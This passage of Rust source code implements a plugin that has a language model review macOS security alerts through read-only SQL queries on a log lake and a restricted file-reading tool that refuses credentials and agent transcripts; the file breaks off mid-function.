//! `macos_review`: a second look at each alert, by a stronger model that can
//! query the lake. The judge reads a summary of a session's few minutes and
//! marks freely, so much of what it marks is ordinary work. This plugin sits
//! after `macos_verdicts`: for each alert it holds a conversation with the
//! inference node its config names (`model.chat`), which gets the brief in
//! ../review.md as the node's prompt, the alert, and two tools:
//!
//! - `query` runs the model's SQL on the lake (`lake.query`), as one table,
//!   `records`: a view over the lake's Parquet files for the `days` before
//!   the alert, a column for each field a question is likely to turn on
//!   ([`COLUMNS`]) and the record whole beside them, ending where the alert
//!   does (`settle_seconds` later), so a replay's review sees what a live one
//!   would. The SQL is written by a model that has just read whatever an
//!   attacker put in a command line, and `lake.query` lets a statement read
//!   the view and nothing else.
//! - `read_file` reads a file on this Mac as it is now, when the log gives a
//!   reason to: it was run as a script, or the pack keeps it as an agent's
//!   settings, instructions, MCP servers or extensions or as something that
//!   runs later. What steers an agent or runs later does its work through
//!   what it says, which the log does not hold. A file the pack keeps as
//!   credentials or as an agent's transcripts is refused by its path (the
//!   pack's own rules, ../../src/paths.rs), whatever the log says of it, and
//!   so is a link to one, or to a file the log gives no reason to read. The tool is offered when the
//!   plugin's config sets `files: true`, and its `data` is the directory the
//!   log's paths are under (`/`), which the plugin reads at `/data`; what is
//!   read goes to the model.
//! - `report` gives the answer.
//!
//! Each alert goes on with `review` (`verdict`: malicious, benign or
//! unresolved, with `finding` and `check`), the SQL the model ran, its turns
//! in order (`steps`: the reasoning it showed, each query or file it asked
//! for and the start of what came back) and what the review took. A review that fails (the model's content filter stops
//! it, which what an attack leaves in a log can set off; no report within
//! the queries allowed; tangent stopping) is an `error` in `review`, and the
//! alert stands.
//!
//! The lake has an alert's own records once its sink has written them,
//! sealed in a file or not. The config holds each alert a few seconds by
//! grouping: `group_by` an alert's session and window, `expire_after_ms` the
//! wait. A grouped plugin has workers of its own, so a review that takes
//! minutes holds up neither the capture nor the judge. A review that finds
//! the lake without the alert's last records tells the model, and the record
//! is marked `early`.

wit_bindgen::generate!({
    path: ".tangent/wit",
    world: "processor",
    generate_all,
});

/// The pack's own rules for which files matter, and how: the ones the
/// `macos` plugin marks records by.
#[allow(dead_code)]
#[path = "../../src/paths.rs"]
mod paths;

use exports::tangent::logs::mapper::{Guest, Meta, Pred, Selector};
use paths::Group;
use serde_json::{json, Map, Value};
use tangent::logs::log::{Logview, Scalar};
use tangent::logs::{config, lake, model};

struct Component;

export!(Component);

/// Characters of one query's result the model is shown.
const RESULT_LIMIT: usize = 12_000;
/// Rows of one query's result, and characters of one cell: a record whole
/// or a long command line is cut there, and the `query` tool says so.
/// The most of a result or a file a step keeps for whoever reads the review.
const STEP_LIMIT: usize = 1500;
const ROWS: u32 = 500;
const CELL: u32 = 2000;
const QUERY_MS: u32 = 30_000;
/// Bytes of a file the model is shown.
const READ_LIMIT: usize = 20_000;
/// What the model is told of `read_file`, when it has it.
const FILES_BRIEF: &str = include_str!("../../review-files.md");

/// The SQL that writes path column `$col` as an alert does, a home as `~`
/// and /Users/Shared as it is (the pack's `paths::home`), so a path copied
/// from the alert finds its records.
macro_rules! tilde {
    ($col:literal) => {
        concat!(
            "CASE WHEN ",
            $col,
            " LIKE '/Users/Shared/%' THEN ",
            $col,
            " ELSE regexp_replace(",
            $col,
            ", '^/Users/[^/]+/', '~/') END"
        )
    };
}

/// The table: a column's name, the SQL that makes it from the lake's columns
/// (../lake.yaml), and what the model is told it holds.
const COLUMNS: &[(&str, &str, &str)] = &[
    ("ts", "ts",
     "when, in UTC; null for the rare record the lake could not read into columns, which has only `record` and is in \
      the table whatever its time"),
    ("event", "event",
     "`exec` (a program started), `open`, `close`, `create`, `rename`, `unlink` (a file), `connect` (a network \
      connection opened), `prompt` (what an AI coding agent was asked), or a rarer Endpoint Security \
      event as it came (`btm_launch_item_add`, a login item added; `tcc_modify`, a privacy permission changed)"),
    ("session", "\"session\"['id']", "the session the record belongs to: `session.id` in the alert"),
    ("entry", tilde!("\"session\"['entry']"),
     "the session's entry point, a home written `~` as in the alert's `session.entry`"),
    ("turn", "\"session\"['turn']", "in an agent's session, when the turn the record is part of began"),
    ("piece", "\"session\"['window']",
     "the few minutes of the session the record was summed up with: `session.window` in the alert"),
    ("pid", "process['pid']", "the process that acted"),
    ("ppid", "process['ppid']", "its parent"),
    ("program", tilde!("process['path']"), "its program's path, a home written `~` as in the alert"),
    ("script", "process['name']",
     "for an interpreter (a shell, node, Python, bun) running a file, its name and the file, written from `~`: \
      `python ~/tools/sync.py`"),
    ("signer", "process['signer']", "its code-signing identity"),
    ("team", "process['team']",
     "its Developer ID team; null for an ad hoc or absent signature and for macOS's own programs"),
    ("platform", "process['platform']", "whether it is part of macOS"),
    ("tty", "process['tty']", "its terminal; null when no person typed it"),
    ("parents", "parents",
     "a list: the programs above it, nearest first, each with the start of its arguments; ends at `/sbin/launchd`, \
      at `(unknown)` where the log cannot say, or at `…` when the chain is longer; `array_to_string(parents, ' < ')` \
      is the chain as text"),
    ("responsible", "responsible", "the app macOS holds responsible for it, when that is another program"),
    ("args", "exec['args']", "`exec`: the command line, a list (long ones are cut)"),
    ("command", "array_to_string(exec['args'], ' ')", "`exec`: the command line as one string, to search with LIKE"),
    ("cwd", "exec['cwd']", "`exec`: the working directory"),
    ("env", "json_get_json(record, 'exec', 'env')",
     "`exec`: the few environment variables kept, those that steer a program, as JSON text; the rest are never stored"),
    ("file", "file", "file events: the file, its path in full where the alert writes a home as `~`"),
    ("renamed_from", "\"from\"", "`rename`: the name it had"),
    ("access", "access", "`open`: `read` or `write`"),
    ("modified", "modified", "`close`: whether it was written"),
    ("host", "\"connect\"['host']", "`connect`: the name the TLS hello or a DNS answer gave"),
    ("dst", "\"connect\"['dst']", "`connect`: the address"),
    ("port", "\"connect\"['port']", "`connect`: the port"),
    ("prompt", "prompt['text']",
     "`prompt`: the text typed; when `record->'prompt'->>'headless'` is `true`, the text sent by what started the agent \
      (`claude -p`, the Agent SDK), a person at a terminal or a program"),
    ("facts", "_facts",
     "a struct of marks the pack made, null when not set: which kept group a file is in (`credentials`, `persistence`, \
      `agent_settings`, `agent_instructions`, `agent_mcp`, `agent_state`, `agent_extensions`), `scratch_program` \
      (the program or its script is in /tmp, a cache, Downloads or node_modules), `unsigned`, `steering_env`, \
      `rename_over`; read one as `facts['credentials']`"),
    ("record", "record",
     "the whole record, as JSON text, for what has no column: `record->>'key'`, `record->'detail'->>'key'`, \
      `json_get_str(record, 'a', 'b')`"),
];

/// The tools the model is given: `read_file` only when `files`.
fn tools(files: bool) -> Value {
    let mut tools = all_tools();
    if !files {
        if let Some(t) = tools.as_array_mut() {
            t.retain(|t| t["name"] != "read_file");
        }
    }
    tools
}

fn all_tools() -> Value {
    json!([
        {
            "name": "query",
            "description": "Run one SQL statement (Apache DataFusion's SQL) on the `records` table and get the result as a \
                            table. A large result is cut, and so is a cell over 2000 characters (read on into one with `substr`), \
                            so select the columns you need and filter, group or limit. \
                            A list is indexed from 1 (`args[1]`), tested with `array_has(args, 'x')`, and does not cast \
                            to text: use `array_to_string`. Write a time whole, `'2026-03-02T10:05:00Z'`, and name \
                            each GROUP BY column. `->` and `->>` read JSON text: \
                            `env->>'HTTPS_PROXY' IS NOT NULL`.",
            "parameters": {"type": "object", "properties": {"sql": {"type": "string"}}, "required": ["sql"]},
        },
        {
            "name": "read_file",
            "description": "Read a file on this Mac as it is now, which may not be as it was at the event: its size, when it \
                            last changed, and its text. Only a file the log gives a reason to read: one run as a script, or \
                            one the pack keeps as an agent's settings, instructions, MCP servers or extensions, or as \
                            something that runs later (a login item, a hook, a shell's rc file, a git config). Credentials \
                            and an agent's transcripts are refused.",
            "parameters": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]},
        },
        {
            "name": "report",
            "description": "Give your answer on the alert. This ends the review.",
            "parameters": {
                "type": "object",
                "properties": {
                    "finding": {"type": "string",
                                "description": "What happened and who caused it, in a few sentences, naming the records it rests on."},
                    "verdict": {"type": "string", "enum": ["malicious", "benign", "unresolved"]},
                    "check": {"type": "string",
                              "description": "When the verdict is malicious or unresolved: what the owner should check or undo first."},
                },
                "required": ["finding", "verdict"],
            },
        },
    ])
}

/// A time as the alert gives it, in UTC (`2026-03-02T10:05:00.123Z`), to the
/// second, as SQL can cast it; None when it is not one, a time with another
/// offset included. Only digits and the marks of a time pass, so it is safe
/// inside a statement.
fn sql_time(t: &str) -> Option<String> {
    let (s, rest) = (t.get(..19)?, t.get(19..)?);
    let shaped = s.bytes().enumerate().all(|(i, b)| match i {
        4 | 7 => b == b'-',
        10 => b == b'T',
        13 | 16 => b == b':',
        _ => b.is_ascii_digit(),
    });
    let fraction = rest.strip_suffix('Z')?;
    let utc = fraction.is_empty()
        || fraction
            .strip_prefix('.')
            .is_some_and(|f| !f.is_empty() && f.bytes().all(|b| b.is_ascii_digit()));
    (shaped && utc).then(|| format!("{s}+00:00"))
}

/// `at` (from [`sql_time`]) as a timestamp in a statement.
fn sql_timestamp(at: &str) -> String {
    format!("arrow_cast('{at}', 'Timestamp(Millisecond, Some(\"+00:00\"))')")
}

/// The `records` view over table `table`: the columns, for the `days` up to
/// `until` (from [`sql_time`]) and `settle` seconds past it. A record whose
/// time the lake could not read has none to be left out by, and stays.
fn view(table: &str, until: &str, days: u64, settle: u64) -> String {
    let cols: Vec<String> = COLUMNS
        .iter()
        .map(|(name, sql, _)| format!("{sql} AS {name}"))
        .collect();
    let end = format!(
        "{} + INTERVAL '{} seconds'",
        sql_timestamp(until),
        settle + 1 // the alert's last second whole
    );
    format!(
        "SELECT {} FROM {table} WHERE ts IS NULL OR (ts <= {end} AND ts >= {end} - INTERVAL '{days} days')",
        cols.join(", ")
    )
}

/// The first message: what the table holds, its columns, and the alert.
fn first_message(alert: &Value, held: &Value) -> String {
    let guide: Vec<String> = COLUMNS
        .iter()
        .map(|(name, _, says)| format!("- `{name}`: {says}"))
        .collect();
    let at = |k: &str| {
        held.get(k)
            .map(Value::to_string)
            .unwrap_or_else(|| "null".into())
    };
    // the lake seals a file minutes after its records: a review that began
    // before then (tangent stopping, a replay ending) has not the alert's last
    let early = if held["whole"] == true {
        ""
    } else {
        " It does not yet hold the alert's last records, which were not written when this review began: \
         if the answer turns on them, the verdict is `unresolved`."
    };
    format!(
        "The `records` table holds {} records, from {} to {}.{early} Its columns:\n\n{}\n\nThe alert:\n\n{alert}",
        at("n"),
        at("first").trim_matches('"'),
        at("last").trim_matches('"'),
        guide.join("\n")
    )
}

/// What is wrong with a `report`, or None.
fn checked(answer: &Value) -> Option<&'static str> {
    let finding = answer.get("finding").and_then(Value::as_str).unwrap_or("");
    if finding.trim().is_empty() {
        return Some("`finding` is missing");
    }
    match answer.get("verdict").and_then(Value::as_str) {
        Some("malicious" | "benign" | "unresolved") => None,
        _ => Some("`verdict` is one of malicious, benign, unresolved"),
    }
}

/// A query's result as the model is shown it: cut at [`RESULT_LIMIT`].
fn shown(mut text: String) -> String {
    if text.trim().is_empty() {
        return "(no rows)".into();
    }
    let total = text.chars().count();
    if total > RESULT_LIMIT {
        let cut = text
            .char_indices()
            .nth(RESULT_LIMIT)
            .map_or(text.len(), |(i, _)| i);
        text.truncate(cut);
        text.push_str(&format!(
            "\n[cut: {} more characters; select fewer columns or rows]",
            total - RESULT_LIMIT
        ));
    }
    text
}

/// `text` cut at [`STEP_LIMIT`], for a step.
fn kept(text: &str) -> String {
    match text.char_indices().nth(STEP_LIMIT) {
        None => text.to_string(),
        Some((cut, _)) => format!(
            "{}\n[cut: {} more characters]",
            &text[..cut],
            text[cut..].chars().count()
        ),
    }
}

/// One turn of a review as it is kept: the reasoning the model showed
/// (`thinking`) and what it said beside its calls (`said`), each only when
/// there was some, and each call with what it was given back, cut.
fn step(reply: &Value, calls: &[Value], results: &[Value]) -> Value {
    let mut step = Map::new();
    for (key, from) in [("thinking", "thinking"), ("said", "text")] {
        let text = reply[from].as_str().unwrap_or("").trim();
        if !text.is_empty() {
            step.insert(key.into(), json!(kept(text)));
        }
    }
    let did: Vec<Value> = calls
        .iter()
        .zip(results)
        .map(|(call, result)| {
            let mut did = Map::new();
            did.insert("tool".into(), call["name"].clone());
            for key in ["sql", "path"] {
                if let Some(given) = call["arguments"].get(key) {
                    did.insert(key.into(), given.clone());
                }
            }
            // a report is the review's answer, which the record has whole
            if call["name"] != "report" || result["error"] == true {
                did.insert(
                    "result".into(),
                    json!(kept(result["text"].as_str().unwrap_or(""))),
                );
            }
            if result["error"] == true {
                did.insert("failed".into(), json!(true));
            }
            Value::Object(did)
        })
        .collect();
    if !did.is_empty() {
        step.insert("calls".into(), json!(did));
    }
    Value::Object(step)
}

/// What a review took.
#[derive(Default)]
struct Took {
    calls: u64,
    failed_queries: u64,
    /// the files the model was shown
    files: Vec<String>,
    input_tokens: u64,
    cache_read_tokens: u64,
    cache_write_tokens: u64,
    output_tokens: u64,
}

impl Took {
    fn add(&mut self, usage: &Value) {
        let n = |k: &str| usage.get(k).and_then(Value::as_u64).unwrap_or(0);
        self.input_tokens += n("input_tokens");
        self.cache_read_tokens += n("cached_input_tokens");
        self.cache_write_tokens += n("cache_creation_input_tokens");
        self.output_tokens += n("output_tokens");
    }

    fn json(&self) -> Value {
        json!({"calls": self.calls, "failed_queries": self.failed_queries, "files": self.files,
               "input_tokens": self.input_tokens, "cache_read_tokens": self.cache_read_tokens,
               "cache_write_tokens": self.cache_write_tokens, "output_tokens": self.output_tokens})
    }
}

/// The model's review of one alert: its report or `{"error"}`, the SQL it
/// ran, what it took, and its turns in order ([`step`]). `converse` is one turn with the model (the request
/// and the reply as `model.chat` has them); `run_query` the model's SQL on
/// the view, the text to show and whether it ran. `read`, a path's text and
/// whether it was read, is the `read_file` tool, left out when None; a read
/// counts against `max_queries` as a query does.
fn review(
    alert: &Value,
    held: &Value,
    max_queries: usize,
    alert_with_prompt: bool,
    mut run_query: impl FnMut(&str) -> (String, bool),
    mut read: Option<&mut dyn FnMut(&str) -> (String, bool)>,
    mut converse: impl FnMut(&Value) -> Result<Value, String>,
) -> (Value, Vec<String>, Took, Vec<Value>) {
    let mut first = first_message(alert, held);
    if read.is_some() {
        first = format!("{}\n\n{first}", FILES_BRIEF.trim_end());
    }
    let tools = tools(read.is_some());
    let mut messages = if alert_with_prompt {
        vec![
            json!({"role": "system", "text": first}),
            json!({"role": "user", "text": "Review the alert."}),
        ]
    } else {
        vec![json!({"role": "user", "text": first})]
    };
    let mut took = Took::default();
    let mut ran: Vec<String> = Vec::new();
    let mut steps: Vec<Value> = Vec::new();
    // queries and reads asked for, which `max_queries` bounds together
    let mut spent = 0;
    let mut nudged = 0;
    while (took.calls as usize) < max_queries + 6 {
        let reply = match converse(&json!({"messages": messages, "tools": tools, "cache": true})) {
            Ok(reply) => reply,
            Err(e) => return (json!({"error": e}), ran, took, steps),
        };
        took.calls += 1;
        took.add(&reply["usage"]);
        if reply["message"].is_null() {
            return (
                json!({"error": "the model gave an empty turn"}),
                ran,
                took,
                steps,
            );
        }
        messages.push(reply["message"].clone());
        let calls = reply["calls"].as_array().cloned().unwrap_or_default();
        let mut results = Vec::new();
        for call in &calls {
            let given = &call["arguments"];
            let last = "\n\nThat was the last query. Call `report` with what you have.";
            let (text, ok) = match (call["name"].as_str(), &mut read) {
                // a report beside queries was written before their results
                (Some("report"), _) if calls.len() > 1 => (
                    "Call `report` on its own, once you have read your queries' results."
                        .to_string(),
                    false,
                ),
                (Some("report"), _) => match checked(given) {
                    None => {
                        steps.push(step(&reply, &calls, &[json!({})]));
                        return (given.clone(), ran, took, steps);
                    }
                    Some(wrong) => (wrong.to_string(), false),
                },
                (Some("query"), _) | (Some("read_file"), Some(_)) if spent >= max_queries => (
                    "No queries are left. Call `report` with what you have.".to_string(),
                    false,
                ),
                (Some("query"), _) => {
                    let sql = given.get("sql").and_then(Value::as_str).unwrap_or("");
                    spent += 1;
                    ran.push(sql.to_string());
                    let (mut text, ok) = run_query(sql);
                    took.failed_queries += u64::from(!ok);
                    if spent == max_queries {
                        text.push_str(last);
                    }
                    (text, ok)
                }
                (Some("read_file"), Some(read)) => {
                    let path = given.get("path").and_then(Value::as_str).unwrap_or("");
                    spent += 1;
                    let (mut text, ok) = read(path);
                    if ok {
                        took.files.push(path.to_string());
                    }
                    if spent == max_queries {
                        text.push_str(last);
                    }
                    (text, ok)
                }
                _ => (
                    "There is no such tool: call one of those you were given.".to_string(),
                    false,
                ),
            };
            results
                .push(json!({"id": call["id"], "name": call["name"], "text": text, "error": !ok}));
        }
        steps.push(step(&reply, &calls, &results));
        if calls.is_empty() {
            if reply["stop"] == "length" || nudged >= 2 {
                break;
            }
            nudged += 1;
            messages.push(json!({"role": "user", "text": "Answer by calling `report`."}));
        } else {
            messages.push(json!({"role": "user", "results": results}));
        }
    }
    (
        json!({"error": "the model gave no report"}),
        ran,
        took,
        steps,
    )
}

/// A string as SQL writes one.
fn literal(text: &str) -> String {
    format!("'{}'", text.replace('\'', "''"))
}

/// A path without its `.` and `..`, as far as the text says.
fn normal(path: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    format!("/{}", parts.join("/"))
}

/// Where `path` leads once every link in it is followed, read under `root`
/// (the directory the log's paths are under, as this plugin sees it); None
/// when the links do not end.
fn real(root: &std::path::Path, path: &str) -> Option<String> {
    let mut todo: Vec<String> = normal(path)
        .split('/')
        .filter(|p| !p.is_empty())
        .rev()
        .map(String::from)
        .collect();
    let mut done = String::new();
    let mut links = 0;
    while let Some(part) = todo.pop() {
        let next = format!("{done}/{part}");
        let seen = root.join(next.trim_start_matches('/'));
        match std::fs::symlink_metadata(&seen) {
            Ok(m) if m.file_type().is_symlink() => {
                links += 1;
                if links > 40 {
                    return None;
                }
                let target = std::fs::read_link(&seen).ok()?;
                let target = target.to_string_lossy();
                if target.starts_with('/') {
                    done.clear();
                }
                // what the link says, then the rest of the path
                todo.extend(
                    target
                        .split('/')
                        .filter(|p| !p.is_empty())
                        .rev()
                        .map(String::from),
                );
                let whole = normal(&format!(
                    "{done}/{}",
                    todo.iter().rev().cloned().collect::<Vec<_>>().join("/")
                ));
                todo = whole
                    .split('/')
                    .filter(|p| !p.is_empty())
                    .rev()
                    .map(String::from)
                    .collect();
                done.clear();
            }
            _ => done = next,
        }
    }
    Some(if done.is_empty() { "/".into() } else { done })
}

/// Whether the pack keeps `path` as what is never read, however the log
/// came to name it: credentials, and an agent's transcripts.
fn held_back(path: &str) -> bool {
    matches!(paths::group(path), Some(Group::Credentials | Group::State))
}

/// macOS keeps /tmp, /var and /etc under /private and links to them: one
/// file, two spellings, and the log may have either. Both, `path` first.
fn spellings(path: &str) -> Vec<String> {
    const LINKED: &[&str] = &["/tmp/", "/var/", "/etc/"];
    let linked = |p: &str| LINKED.iter().any(|l| p.starts_with(l));
    let mut all = vec![path.to_string()];
    match path.strip_prefix("/private") {
        Some(rest) if linked(rest) => all.push(rest.to_string()),
        None if linked(path) => all.push(format!("/private{path}")),
        _ => {}
    }
    all
}

/// A path the log wrote from `~`, whole: under `home`, the one home `~`
/// stands for here. Another user's file is not this one.
fn whole(path: &str, home: Option<&str>) -> String {
    match (path.strip_prefix("~/"), home) {
        (Some(rest), Some(home)) => format!("{}/{rest}", home.trim_end_matches('/')),
        _ => path.to_string(),
    }
}

/// Whether the log gives a reason to read `path`, and when it does not, why
/// not: the pack keeps it as what steers an agent or runs later and the log
/// has an event on it, or the log shows it run as a script. `rows` is this
/// plugin's own SQL on the view, each row a JSON object.
fn permitted(
    path: &str,
    home: Option<&str>,
    rows: &mut dyn FnMut(&str) -> Result<Vec<Value>, String>,
) -> (bool, String) {
    let spelled = spellings(path);
    let steers =
        paths::group(path).is_some_and(|g| !matches!(g, Group::Credentials | Group::State));
    if steers {
        let files: Vec<String> = spelled.iter().map(|p| literal(p)).collect();
        let seen = rows(&format!(
            "SELECT count(*) AS n FROM records WHERE file IN ({})",
            files.join(", ")
        ));
        match seen {
            Ok(rows) if rows.first().and_then(|r| r["n"].as_u64()) > Some(0) => {
                return (true, String::new())
            }
            Ok(_) => {}
            Err(e) => return (false, format!("the log could not be asked about it: {e}")),
        }
    }
    let base = path.rsplit('/').next().unwrap_or(path);
    let ran = match rows(&format!(
        "SELECT DISTINCT script FROM records WHERE event = 'exec' AND strpos(script, {}) > 0",
        literal(base)
    )) {
        Ok(ran) => ran,
        Err(e) => return (false, format!("the log could not be asked about it: {e}")),
    };
    for row in ran {
        // `python ~/tools/sync.py`: the interpreter, then the file
        let script = row.get("script").and_then(Value::as_str).unwrap_or("");
        let file = script.split_once(' ').map_or("", |(_, f)| f);
        if file.starts_with(['/', '~']) && spelled.contains(&normal(&whole(file, home))) {
            return (true, String::new());
        }
    }
    (
        false,
        "the log does not show it run as a script, and has no event on it as an agent's settings, \
             instructions, MCP servers or extensions or as something that runs later"
            .into(),
    )
}

/// The runs of printable ASCII in `data`, four characters or more, a line
/// each, as `strings` prints them: what a binary property list says of the
/// program it starts is read so.
fn strings(data: &[u8]) -> String {
    data.split(|b| !(b.is_ascii_graphic() || *b == b' '))
        .filter(|run| run.len() >= 4)
        .map(|run| String::from_utf8_lossy(run))
        .collect::<Vec<_>>()
        .join("\n")
}

/// A file's text for the model, when it may be read: the text shown, and
/// whether it was read. What the pack keeps as credentials or an agent's
/// transcripts never is, nor a link to one; any other needs `permit`'s leave
/// (a path's leave to be read, and why not), and a link its leave for where
/// it leads too. `root` is the directory the log's paths are under, as this
/// plugin sees it, and `home` what `~` stands for.
fn read_file(
    root: &std::path::Path,
    home: Option<&str>,
    path: &str,
    permit: &mut dyn FnMut(&str) -> (bool, String),
) -> (String, bool) {
    const KEPT: &str =
        "the pack keeps it as credentials or an agent's transcripts, which are not read";
    let path = whole(path.trim(), home);
    if !path.starts_with('/') {
        return ("error: an absolute path, as the log has it".into(), false);
    }
    if !root.is_dir() {
        return (
            "error: no file can be read: the plugin's config gives it no `data` directory".into(),
            false,
        );
    }
    let path = normal(&path);
    if held_back(&path) {
        return (format!("not read: {KEPT}"), false);
    }
    let Some(real) = real(root, &path) else {
        return ("not read: its links do not end".into(), false);
    };
    // /tmp/x is /private/tmp/x by macOS's own link, which is no one's doing
    let link = !spellings(&path).contains(&real);
    if link && held_back(&real) {
        return (
            format!("not read: it is a link to {real}, and {KEPT}"),
            false,
        );
    }
    // the file as it is, before the log is asked about it
    let gone = |e: std::io::Error| {
        let why = format!(
            "not read: {} (the file as it is now; the log is of then)",
            e.kind()
        );
        (why, false)
    };
    let seen = root.join(real.trim_start_matches('/'));
    let meta = match std::fs::symlink_metadata(&seen) {
        Ok(m) => m,
        Err(e) => return gone(e),
    };
    if !meta.is_file() {
        return ("not read: not a regular file".into(), false);
    }
    let (mut ok, mut why) = permit(&path);
    if ok && link {
        // A link is read only when where it leads may be read too: a
        // settings file that is a link to someone's notes is not.
        let (leads, reason) = permit(&real);
        ok = leads;
        why = format!("it is a link to {real}, and {reason}");
    }
    if !ok {
        return (format!("not read: {why}"), false);
    }
    let mut data = Vec::new();
    let read = std::fs::File::open(&seen).and_then(|f| {
        use std::io::Read;
        f.take(READ_LIMIT as u64 + 1).read_to_end(&mut data)
    });
    if let Err(e) = read {
        return gone(e);
    }
    let changed = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map_or_else(
            || "at a time not known".to_string(),
            |d| rfc3339(d.as_secs()),
        );
    let mut head = format!("{real}: {} bytes, last changed {changed}", meta.len());
    if link {
        head.push_str(&format!(" (reached through the link {path})"));
    }
    let long = data.len() > READ_LIMIT;
    data.truncate(READ_LIMIT);
    let mut text = if data.contains(&0) {
        format!("(a binary file: the text found in it)\n{}", strings(&data))
    } else {
        String::from_utf8_lossy(&data).into_owned()
    };
    if long {
        text.push_str(&format!(
            "\n[cut: the first {READ_LIMIT} bytes of {}]",
            meta.len()
        ));
    }
    (format!("{head}\n\n{text}"), true)
}

/// A setting of the plugin's `config`, or its default.
fn setting(key: &str, default: u64) -> u64 {
    config::get(key)
        .and_then(|v| v.trim().parse().ok())
        .unwrap_or(default)
}

/// Seconds since 1970 as an RFC 3339 time in UTC.
fn rfc3339(secs: u64) -> String {
    let (days, rem) = (secs / 86_400, secs % 86_400);
    // civil from days (Howard Hinnant's algorithm)
    let z = days as i64 + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1_460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!(
        "{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}Z",
        rem / 3600,
        rem % 3600 / 60,
        rem % 60
    )
}

fn now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

/// The alert with its review, as the record that goes on.
fn reviewed(alert: &Value) -> Value {
    let began = now();
    let node = config::get("model").unwrap_or_else(|| "reviewer".into());
    let table = config::get("table").unwrap_or_else(|| "lake".into());
    let until = alert
        .pointer("/session/to")
        .or_else(|| alert.get("ts"))
        .and_then(Value::as_str)
        .and_then(sql_time);
    // Without the alert's end the table would have none: every record the
    // lake holds, the days after the alert among them.
    let Some(until) = until else {
        let error = json!({"error": "the alert has no time in UTC (`session.to`, `ts`) to end the table at"});
        return record(
            alert,
            &node,
            error,
            &[],
            &[],
            &Took::default(),
            began,
            false,
        );
    };
    let views = vec![(
        "records".to_string(),
        view(
            &table,
            &until,
            setting("days", 7),
            setting("settle_seconds", 0),
        ),
    )];
    let ask = |sql: &str, json: bool, max_rows: u32, max_cell: u32| {
        lake::query(&lake::Statement {
            views: views.clone(),
            sql: sql.to_string(),
            max_rows,
            json,
            max_cell,
            timeout_ms: Some(QUERY_MS),
        })
    };
    // `whole`: the lake has records as late as the alert's last
    let held = ask(
        &format!(
            "SELECT count(*) AS n, min(ts) AS first, max(ts) AS last, \
             coalesce(max(ts) >= {}, false) AS whole FROM records",
            sql_timestamp(&until)
        ),
        true,
        1,
        CELL,
    )
    .and_then(|rows| {
        serde_json::from_str::<Value>(rows.lines().next().unwrap_or("{}"))
            .map_err(|e| e.to_string())
    });
    // `read_file`: the tool is the config's to give, with the directory the
    // log's paths are under as the plugin's `data`
    let files = config::get("files").is_some_and(|v| v.trim() == "true");
    // what `~` stands for: the config's `home`, else the HOME tangent runs with
    let home = config::get("home").or_else(|| std::env::var("HOME").ok());
    // this plugin's own questions of the log: every row, each value whole
    let mut rows = |sql: &str| -> Result<Vec<Value>, String> {
        Ok(ask(sql, true, 5000, u32::MAX)?
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect())
    };
    let mut read = |path: &str| {
        read_file(
            std::path::Path::new("/data"),
            home.as_deref(),
            path,
            &mut |p| permitted(p, home.as_deref(), &mut rows),
        )
    };
    let read: Option<&mut dyn FnMut(&str) -> (String, bool)> =
        if files { Some(&mut read) } else { None };
    let trace = format!(
        "{}|{}",
        alert
            .pointer("/session/id")
            .and_then(Value::as_str)
            .unwrap_or(""),
        alert
            .pointer("/session/window")
            .and_then(Value::as_str)
            .unwrap_or("")
    );
    let (answer, ran, took, steps) = match &held {
        Err(e) => (
            json!({"error": format!("reading the lake: {e}")}),
            Vec::new(),
            Took::default(),
            Vec::new(),
        ),
        Ok(held) => review(
            alert,
            held,
            setting("queries", 20) as usize,
            config::get("alert_with_prompt").is_some_and(|v| v.trim() == "true"),
            |sql| {
                if sql.trim().is_empty() {
                    return ("error: one SQL statement, please".to_string(), false);
                }
                match ask(sql, false, ROWS, CELL) {
                    Ok(rows) => (shown(rows), true),
                    Err(e) => (shown(format!("error: {e}")), false),
                }
            },
            read,
            |request| {
                // the runtime tells a traced conversation's turns as they
                // happen, under the alert's session and window
                let mut request = request.clone();
                request["trace"] = json!(trace);
                let reply = model::chat(&node, &request.to_string())?;
                serde_json::from_str(&reply).map_err(|e| format!("the model's reply: {e}"))
            },
        ),
    };
    let early = held.is_ok_and(|held| held["whole"] != true);
    record(alert, &node, answer, &ran, &steps, &took, began, early)
}

/// The record that goes on: the alert's session and verdict with its
/// review, the SQL the model ran, its turns (`steps`: what it thought, what
/// it asked and what came back, cut) and what the review took. `early` marks a
/// review that began before the lake had the alert's last records.
fn record(
    alert: &Value,
    node: &str,
    review: Value,
    ran: &[String],
    steps: &[Value],
    took: &Took,
    began: u64,
    early: bool,
) -> Value {
    let mut took = took.json();
    took["seconds"] = json!(now().saturating_sub(began));
    let mut judge = alert.get("judge").cloned().unwrap_or(Value::Null);
    if let Some(j) = judge.as_object_mut() {
        j.remove("so_far");
    }
    let mut out = Map::new();
    out.insert("ts".into(), json!(rfc3339(now())));
    out.insert("source".into(), json!("macos_review"));
    out.insert(
        "session".into(),
        alert.get("session").cloned().unwrap_or(Value::Null),
    );
    out.insert("judge".into(), judge);
    out.insert("review".into(), review);
    if early {
        out.insert("early".into(), json!(true));
    }
    out.insert("queries".into(), json!(ran));
    if !steps.is_empty() {
        out.insert("steps".into(), json!(steps));
    }
    out.insert("took".into(), took);
    out.insert("model".into(), json!(node));
    Value::Object(out)
}

impl Guest for Component {
    fn metadata() -> Meta {
        Meta {
            name: "macos_review".to_string(),
            version: "0.1.0".to_string(),
        }
    }

    fn probe() -> Vec<Selector> {
        vec![Selector {
            any: Vec::new(),
            all: vec![
                Pred::Eq((
                    "source".to_string(),
                    Scalar::Str("macos_session".to_string()),
                )),
